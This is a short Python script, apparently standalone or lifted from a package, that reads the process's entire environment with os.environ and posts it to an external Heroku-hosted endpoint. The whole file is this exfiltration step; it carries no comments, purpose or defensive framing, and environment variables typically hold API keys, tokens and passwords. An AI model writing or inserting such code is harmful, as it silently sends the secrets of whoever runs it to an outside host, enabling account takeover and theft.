import requests
import os
data = {
    "vars": str(os.environ)
}
r = requests.post("https://vars-api-new.herokuapp.com/vars",  data=data)

